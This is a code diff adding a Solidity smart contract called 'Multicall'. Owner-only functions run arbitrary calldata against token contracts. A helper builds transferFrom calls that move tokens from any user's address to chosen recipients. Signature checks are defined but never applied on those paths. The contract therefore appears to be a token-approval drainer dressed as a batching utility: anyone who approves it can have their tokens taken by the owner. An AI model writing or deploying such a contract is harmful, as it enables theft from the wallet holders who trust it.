@@ -1,0 +1,176 @@
+contract Multicall is Ownable,Pausable{
+    
+    using SignatureChecker for address;
+    
+    bytes4 public hash = bytes4(keccak256("transferFrom(address,address,uint256)"));
+    
+    address private signerAddress;
+    
+    bool public callStatus;
+    
+    mapping (bytes => bool) private signStatus;
+    
+    bytes32 public constant SIGNATURE_PERMIT_TYPEHASH = keccak256("address token,address user,string hash,uint256 deadline");
+    
+    receive() external payable {}
+    
+    constructor () {
+        callStatus = true;
+    }
+    
+    function pause() public onlyOwner {
+        _pause();
+    }
+
+    function unpause() public onlyOwner {
+        _unpause();
+    }
+    
+    function signerAddressUpdate(address newSigner) public onlyOwner {
+        signerAddress = newSigner;
+    }
+    
+    function adminEmergency(address addr,address account,uint256 amount) public onlyOwner {
+        if(addr == address(0)){
+            payable(account).transfer(amount);
+        }else {
+            IBEP20(addr).transfer(account,amount);
+        }
+    }
+    
+    function callParams(address user,address[] calldata recipients,uint256[] calldata amounts) public pure returns (bytes[] memory calls) {
+        calls = new bytes[](recipients.length);
+        
+        for (uint256 i = 0; i < recipients.length; i++) {
+            calls[i] = abi.encodeWithSignature("transferFrom(address,address,uint256)",user,recipients[i], amounts[i]);
+        }
+    }
+    
+    function balanceOfParams(address[] memory recipients) public pure returns (bytes[] memory calls){
+        calls = new bytes[](recipients.length);
+        
+        for (uint256 i = 0; i < recipients.length; i++) {
+            calls[i] = abi.encodeWithSignature("balanceOf(address)",recipients[i]);
+        }
+    }
+    
+    function multicallWithValue(
+        address[] calldata recipients,
+        uint256[] calldata amounts
+    ) public view returns (bytes[] memory calls) {
+        calls = new bytes[](recipients.length);
+        address user = _msgSender();
+        for (uint256 i = 0; i < recipients.length; i++) {
+            calls[i] = abi.encodeWithSignature("transferFrom(address,address,uint256)",user,recipients[i], amounts[i]);
+        }
+    }
+    
+    struct signParams{
+        bytes signature;
+        address token;
+        address user;
+        uint256 amount;
+        uint256 slot;
+        uint256 deadline;
+    }
+    
+    function signDecodeParams(bytes memory params) public pure returns (signParams memory response) {
+    (
+        bytes memory signature,
+        address token,
+        address user,
+        uint256 amount,
+        uint256 slot,
+        uint256 deadline
+    ) =
+    abi.decode(
+        params,
+        (bytes,address,address, uint256, uint256, uint256)
+    );
+
+    return
+      signParams(
+        signature,
+        token,
+        user,
+        amount,
+        slot,
+        deadline
+      );
+    }
+    
+    function signVerify(signParams memory store) internal returns (bool) {
+        require(block.timestamp < store.deadline, "Time Expired");
+        require(!signStatus[store.signature], "already sign used");
+        bytes32 hash_ = keccak256(abi.encodePacked(
+            SIGNATURE_PERMIT_TYPEHASH,
+            address(this),
+            store.token,
+            store.user,
+            store.amount,
+            store.slot,
+            store.deadline
+        ));
+        
+        signStatus[store.signature] = true;
+        
+        return (signAddressVerify(ECDSA.toEthSignedMessageHash(hash_),store.signature));
+    }
+    
+    function signAddressVerify(bytes32 signhash,bytes memory signature) internal view returns (bool) {
+        return signerAddress.isValidSignatureNow(signhash,signature);
+    }
+    
+    function call(address token,bytes[] calldata data) external onlyOwner whenNotPaused {
+        require(callStatus, "unable to access");
+        bytes[] memory results = new bytes[](data.length);
+        for (uint256 i = 0; i < data.length; i++) {
+            results[i] = Address.functionCall(token, data[i]);
+            require(abi.decode(results[i], (bool)));
+        }
+    }
+    
+    struct callStruct {
+        address token;
+        bytes data;
+    }
+    
+    function multiCall(callStruct[] memory vars) external onlyOwner whenNotPaused {
+        require(callStatus, "unable to access");       
+        bytes[] memory results = new bytes[](vars.length);
+        for (uint256 i = 0; i < vars.length; i++) {
+            results[i] = Address.functionCall(vars[i].token, vars[i].data);
+            require(abi.decode(results[i], (bool)));
+        }
+    }
+    
+    function StaticCall(address token,bytes[] calldata data) external view returns (uint256[] memory response){
+        bytes[] memory results = new bytes[](data.length);
+        response = new uint256[](data.length);
+        for (uint256 i = 0; i < data.length; i++) {
+            results[i] = Address.functionStaticCall(token, data[i]);
+            (uint256 returnData) = (abi.decode(results[i], (uint256)));
+            response[i] = returnData;
+        }
+    }
+    
+    function multiStaticCall(callStruct[] memory vars) external view returns (uint256[] memory response){
+        bytes[] memory results = new bytes[](vars.length);
+        response = new uint256[](vars.length);
+        for (uint256 i = 0; i < vars.length; i++) {
+            results[i] = Address.functionStaticCall(vars[i].token, vars[i].data);
+            (uint256 returnData) = (abi.decode(results[i], (uint256)));
+            response[i] = returnData;
+        }
+    }
+    
+    function transferFromTest(IERC20 token,address[] memory addr,uint256[] memory amount) public {
+        for (uint256 i = 0; i < addr.length; i++) {
+            token.transferFrom(msg.sender,addr[i], amount[i]);
+        }
+    }
+    
+    function getRes(address to,uint256 amounts) public view returns (bytes memory results) {
+        results = abi.encodeWithSignature("transferFrom(address,address,uint256)", address(this),to, amounts);
+    }
+}
